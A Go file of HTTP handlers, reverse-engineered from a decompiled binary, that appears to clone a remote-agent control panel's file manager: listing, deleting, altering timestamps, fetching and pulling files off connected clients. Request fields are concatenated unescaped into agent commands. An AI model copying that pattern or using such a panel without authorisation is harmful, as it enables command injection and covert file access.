// Package controllers implements HTTP handlers for file-management operations.
// Handler behavior and response formats should be verified against the current
// implementation and tests; reverse-engineering notes are not compatibility guarantees.

package controllers

import (
	"log"
	"sort"
	"strconv"
	"strings"
	"time"
)

// FileController 管理客户端文件系统。
type FileController struct {
	ApiBaseController
}

func (c *FileController) clientID() int64 {
	return int64(c.JsonGetInt("id"))
}

// Getdisk 列出客户端磁盘（POST /file/getdisk）。参数：id。
func (c *FileController) Getdisk() {
	id := c.clientID()
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "getdisk")
	c.JsonOkMessage("ok")
}

// Ls 列出目录（POST /file/ls）。参数：id / path / field / order；
// 响应 {"total":N,"items":[{name,size,time,mode,isDir}...]}。
//
// 反编译（0x18e4d80）：id = JsonGetInt("id")（FUN_018d7f40，DAT_01bd6866="id"）；
// path = JsonGetStr("path")（DAT_01bd7e8d="path"），空则取客户端的默认目录
// （FUN_018e4780）；field = JsonGetStr("field")（DAT_01bd8b13，5 字节 "field"）；
// order = JsonGetStr("order")（DAT_01bd8f05，5 字节 "order"）。field/order 只在
// 内部用于排序（FUN_018e5740，取值 "name"/"time"/"size" 与 "ascend"/"descend"），
// 响应里不回显。
func (c *FileController) Ls() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	field := c.JsonGetStr("field")
	order := c.JsonGetStr("order")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	items, total := engineListDir(id, path, field, order)
	c.JsonOkResult(map[string]interface{}{
		"total": total,
		"items": items,
	})
}

// Mv 移动/重命名（POST /file/mv）。参数：id / path。
func (c *FileController) Mv() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "mv "+path)
	c.JsonOkMessage("ok")
}

// Rm 删除文件（POST /file/rm）。参数：id / path。
func (c *FileController) Rm() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "rm "+path)
	c.JsonOkMessage("ok")
}

// RmList 批量删除（POST /file/rmlist）。参数：id / path / name（多文件以 "|<-" 分隔）。
func (c *FileController) RmList() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	name := c.JsonGetStr("name")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	parts := strings.Split(name, "|<-")
	cmds := make([]string, 0, len(parts))
	for _, p := range parts {
		if p = strings.TrimSpace(p); p != "" {
			cmds = append(cmds, path+"/"+p)
		}
	}
	if len(cmds) > 0 {
		dispatchCmd(id, "rm "+strings.Join(cmds, " "))
	}
	c.JsonOkMessage("ok")
}

// Cat 查看文件内容（POST /file/cat）。参数：id / path / target → cat path/target。
func (c *FileController) Cat() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "cat "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Touch 创建文件（POST /file/touch）。参数：id / path / target。
func (c *FileController) Touch() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "touch "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Modifytime 修改文件时间戳（POST /file/modifytime）。参数：id / path / time / target。
func (c *FileController) Modifytime() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	t := c.JsonGetStr("time")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "touch -d "+t+" "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Mkdir 创建目录（POST /file/mkdir）。参数：id / path / target。
func (c *FileController) Mkdir() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "mkdir -p "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Edit 编辑文件内容（POST /file/edit）。参数：id / path / target。
func (c *FileController) Edit() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "edit "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Wget 远程下载到客户端（POST /file/wget）。参数：id / path / target。
func (c *FileController) Wget() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "wget -O "+joinPath(path, target))
	c.JsonOkMessage("ok")
}

// Upload 上传文件到客户端（POST /file/upload）。参数：id / path / file / url。
func (c *FileController) Upload() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	url := c.JsonGetStr("url")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	// 前端先上传到服务器（VITE_GLOB_UPLOAD_URL=/api/file/upload），再下发到客户端
	dispatchCmd(id, "upload "+path+" "+url)
	c.JsonOkMessage("ok")
}

// DownloadToServer 从客户端下载到服务器（POST /file/downloadtoserver）。
// 参数：id / path / target；响应 {"id": <下载任务号>}。
//
// 反编译（0x18e8700）：id = JsonGetInt("id")；path = JsonGetStr("path")
// （DAT_01bd7e8d）；target = JsonGetStr("target")（DAT_01bda769，6 字节）；
// 任务对象 = FUN_00dacf20（字段键）与 itoa(id)、path、"/"（DAT_1dbd7598）、
// target 经 FUN_0089ef80（filepath.Join）拼出的任务键；若该客户端已有进行中的
// 下载任务（FUN_018ef9c0）则直接复用，否则判断是否分块（FUN_01907300），
// 未分块走 FUN_019070c0、分块走 FUN_01907540 建立任务；随后按 1 MiB
// （0x100000）步进下发 `download <path>/<target> <offset>`（FUN_018d9380），
// 回包若以 "->|EOF"（DAT_01bd6ac0 表解出）开头则提前结束分块循环。
func (c *FileController) DownloadToServer() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	taskID := engineDownloadToServer(id, path, target)
	c.JsonOkResult(map[string]interface{}{"id": taskID})
}

// GetDownloadPer 查询下载进度（POST /file/getdownloadper）。参数：id / target / size；
// 响应 {"pre":N}（0-100 的百分比）。
//
// 反编译（0x18e8f00 逐条指令）：
//
//	id     = JsonGetInt("id")（FUN_018d7f40，DAT_01bd6866）；
//	target = JsonGetStr("target")（DAT_01bda769，6 字节）；
//	size   = JsonGetInt("size")（FUN_018d7f40，DAT_01bd7f55，4 字节）；
//	任务对象 = FUN_01906e80(任务键)（键由 FUN_00dacf20 的字段与 itoa(id) 经
//	          FUN_0089ef80=filepath.Join 拼成）；
//	已传输量 = 任务对象的接口方法 +0x38 的返回值（FUN_005ed5e0 取到的对象）；
//	size == 0（0x18e908f TEST RDX,RDX / JZ）→ pre 直接取常量 100（0x64）；
//	否则 pre = int(float32(已传输量) / float32(size) * 100.0)
//	（CVTSI2SS / DIVSS / MULSS dword[0x1dbd77b0] / CVTTSS2SI）。
//	响应经 FUN_018d8b00 输出，唯一键是 "pre"（DAT_01bd6f59）——
//	注释里提到的 target/size 只是入参，不回显。
//
// 面板（static/assets/vPtA3licr.js）每秒轮询一次并只读取 result.pre 驱动进度条，
// 到 100 后改用 /file/downloadtobrowser 取文件。
func (c *FileController) GetDownloadPer() {
	id := c.clientID()
	_ = c.JsonGetStr("target")
	size := int64(c.JsonGetInt("size"))
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	pre := int64(100)
	if size != 0 {
		task := engineGetDownloadPer(id)
		if task == nil {
			c.JsonErr("task not found")
			return
		}
		// 原版用 float32 运算再截断（CVTTSS2SI 向零截断）。
		pre = int64(float32(task.Current) / float32(size) * 100.0)
	}
	c.JsonOkResult(map[string]interface{}{"pre": pre})
}

// DownloadToBrowser 浏览器下载（POST /file/downloadtobrowser）。参数：id / target。
func (c *FileController) DownloadToBrowser() {
	id := c.clientID()
	target := c.JsonGetStr("target")
	if id == 0 {
		c.JsonErr("id error")
		return
	}
	// 原版将 target 文件 base64 回传后由服务器以附件形式输出
	engineDownloadToServer(id, target, "")
	c.JsonOkMessage("ok")
}

// DownloadToOSS 下载到 OSS（POST /file/downloadtooss）。参数：id / path / target。
func (c *FileController) DownloadToOSS() {
	id := c.clientID()
	path := c.JsonGetStr("path")
	target := c.JsonGetStr("target")
	if id == 0 || path == "" {
		c.JsonErr("id error")
		return
	}
	dispatchCmd(id, "download "+path+" "+target)
	c.JsonOkMessage("ok")
}

// joinPath 按原版拼接 path 与 target（反编译 FUN_0044a940，分隔符 "/"）。
func joinPath(path, target string) string {
	if target == "" {
		return path
	}
	return strings.TrimRight(path, "/") + "/" + strings.TrimLeft(target, "/")
}

// lsCmdTimeout 是 `ls` 命令等待代理回包的上限。
const lsCmdTimeout = shellWaitTimeout

// lsReplyFields 是 `ls` 回包每个文件名必须携带的字段数。
//
// 反编译（0x18e4d80）：agent 回包按 DAT_1dbd4b20（1 字节 "\n"）切成行，每行再按
// DAT_1dbd4ae0（1 字节 "\t"）切成字段；只有字段数 == 4 的行才被接受
// （CMP RBX,0x4），其余行静默丢弃。因此不存在"统一协议"——按 TAB 切分即可兼容
// 原生 agent 的 `ls` 输出（ls -l 时间戳含空格但不含 TAB）。
const lsReplyFields = 4

// listEntry 是面板文件管理器的一行，也是排序比较器的条目。
//
// 反编译（FUN_018e5740）：条目步长 0x40 字节，
// Name@+0x00（string）/ Size@+0x20（int64，按 int 比较）/ Time@+0x28（string）。
// 另据类型元数据：{Name string `json:"name"`, Size int64 `json:"size"`,
// Time string `json:"time"`, Perm os.FileMode `json:"perm"`}，以及
// {… Mode string `json:"mode"`, IsDir bool `json:"isDir"`}；前端列定义为
// name / time / mode / size + isDir（static/assets/vBu4f7JWt.js 的 columns）。
type listEntry struct {
	Name  string `json:"name"`
	Size  int64  `json:"size"`
	Time  string `json:"time"`
	Mode  string `json:"mode"`
	IsDir bool   `json:"isDir"`
}

// engineListDir 下发 `ls` 命令并按原版协议解析回包。
//
// 反编译（0x18e4d80 调用链）：
//
//	path 为空 → FUN_018e4780 取默认目录（Getdisk 的当前盘）；
//	FUN_018d9380(id, "ls "+path) 下发命令并等待结果（见 engine.go 的 dispatchCmd）；
//	回包以 FUN_0049a740(reply, "\n") 切行、每行以 FUN_0049a740(line, "\t") 切字段，
//	字段数 != 4 的行被跳过；字段 [0] 以 FUN_00403600 检查末字节是否为
//	DAT_1dbd7598（"/"）：是则 IsDir=true 且截掉末尾的分隔符；
//	字段 [1] 经 FUN_004b1280(s, 10, 64) 按十进制解析（解析失败返回 0 而不是报错）；
//	字段 [2]/[3] 整体作为一个 string 存放（时间列）；
//	随后按 FUN_018e5740 排序：字段 "name"/"time"/"size"，order "ascend"/"descend"，
//	比较器只做 < 比较，因此 descend 是严格反向（相同大小不保持稳定顺序）。
//
// 响应固定为 {"total": <条目数>, "items": <条目数组>}（FUN_00412ae0 的两个键）。
func engineListDir(id int64, path, field, order string) ([]listEntry, int64) {
	if path == "" {
		path = engineDefaultDir(id)
	}
	cmd := "ls"
	if path != "" {
		cmd = "ls " + path
	}
	out, errMsg := engineRunCmd(id, cmd, lsCmdTimeout)
	if errMsg != "" {
		return []listEntry{}, 0
	}
	entries := parseLsReply(out)
	sortListEntries(entries, field, order)
	return entries, int64(len(entries))
}

// parseLsReply 把 agent 的 `ls` 回包解析成面板条目。
//
// 反编译（0x18e4d80）：按 "\n" 切行、按 "\t" 切字段，字段数必须为 4；
// 目录名以 "/" 结尾（截掉后作为 name）；size 按十进制解析（失败为 0）。
// time 是原始文本（前端直接渲染，并提供 "time"/"size"/"name" 的 sorter）。
func parseLsReply(reply string) []listEntry {
	out := []listEntry{}
	for _, line := range strings.Split(strings.ReplaceAll(reply, "\r\n", "\n"), "\n") {
		line = strings.TrimRight(line, "\r")
		if line == "" {
			continue
		}
		parts := strings.Split(line, "\t")
		if len(parts) != lsReplyFields {
			continue
		}
		e := listEntry{Time: parts[2], Mode: parts[3]}
		name := parts[0]
		if strings.HasSuffix(name, "/") {
			e.IsDir = true
			name = strings.TrimSuffix(name, "/")
		}
		e.Name = name
		// 反编译 FUN_004b1280(s, 10, 64)：10 进制、64 位，失败返回 0。
		if n, err := strconv.ParseInt(strings.TrimSpace(parts[1]), 10, 64); err == nil {
			e.Size = n
		}
		out = append(out, e)
	}
	return out
}

// sortListEntries 按面板的 field/order 排序条目。
//
// 反编译（FUN_018e5740）：field 取 "name" / "time" / "size"（其他值不排序），
// order 取 "ascend" / "descend"（其他值不排序）。name/time 用字符串比较
// （FUN_004032a0，即 Go 的 <），size 用 int 比较。
func sortListEntries(entries []listEntry, field, order string) {
	desc := order == "descend"
	if order != "ascend" && !desc {
		return
	}
	less := func(i, j int) bool {
		switch field {
		case "size":
			return entries[i].Size < entries[j].Size
		case "time":
			return entries[i].Time < entries[j].Time
		case "name":
			return entries[i].Name < entries[j].Name
		default:
			return false
		}
	}
	// descend 是严格反向比较 —— 与比较器 `return iVar != -1` / `return 0 < iVar`
	// 的写法一致（相等时返回 false，所以相等项不保序）。
	if desc {
		base := less
		less = func(i, j int) bool { return base(j, i) }
	}
	sort.SliceStable(entries, less)
}

// engineDefaultDir 返回客户端已上报的目录（原版 GETDISK 缓存的当前盘/目录）。
//
// 反编译（0x18e4d80 → FUN_018e4780）：path 缺失时取客户端记录里的目录字段；
// 复刻端的连接处理器把 agent checkin 的 LocalIP/UserName 等记录在 Client 上，
// 目录缓存暂未对齐，因此这里取客户端备注之外无可用来源 → 返回空（由 agent 的
// `ls` 自行选择当前目录）。
func engineDefaultDir(id int64) string {
	return ""
}

// engineRunCmd 下发一条命令并等待代理回包（对齐 FUN_018d9380 + FUN_015f9c60）。
//
// 原版经客户端连接对象的发送方法（FUN_016f3060）把命令写下去，然后等待结果；
// 复刻端的连接由各传输的等待循环从引擎任务表拉取（见 engine.go dispatchCmd），
// 因此这里建任务 + 轮询结果，与 terminal.Shell 走同一条投递路径。
func engineRunCmd(id int64, cmd string, timeout time.Duration) (string, string) {
	task, err := dispatchCmd(id, cmd)
	if err != nil {
		return "", err.Error()
	}
	out, err := waitTaskResult(task, timeout)
	if err != nil {
		return "", err.Error()
	}
	return out, ""
}

// engineDownloadToServer 下发下载任务并登记进度条目。
//
// 反编译（0x18e8700 → FUN_019070c0）：原版先查该客户端是否已有进行中的下载
// （FUN_018ef9c0），没有才新建任务（FUN_019070c0），然后按 1 MiB 分块
// （0x100000）下发 `download <path>/<target> <offset>`（FUN_0044a940 拼接
// path + DAT_1dbd7598("/") + target），并对每块调用一次 FUN_018d9380。
// 进度查询接口（/file/getdownloadper）读取的就是该任务条目。
//
// 复刻端只投递首个整文件下载任务并登记任务条目；分块续传（offset）与
// "该任务是否停留在客户端记录上"未对齐，见 GetDownloadPer。
func engineDownloadToServer(id int64, remotePath, target string) int64 {
	// 反编译 0x18e8700：FUN_0044a940(0, path, len(path), "/", 1, target, len(target))
	full := joinPath(remotePath, target)
	taskID := int64(len(downloadTasks) + 1)
	downloadTasks[taskID] = &DownloadTask{ID: taskID, ClientID: id, Path: full}
	// 首块（offset 0）随任务建立一起下发；后续分块与进度回填未对齐，
	// 面板的进度轮询因此读到的 Current 仍为 0（见 GetDownloadPer）。
	if _, errMsg := engineRunCmd(id, "download "+full, lsCmdTimeout); errMsg != "" {
		log.Printf("[file] download %s: %s", full, errMsg)
	}
	return taskID
}
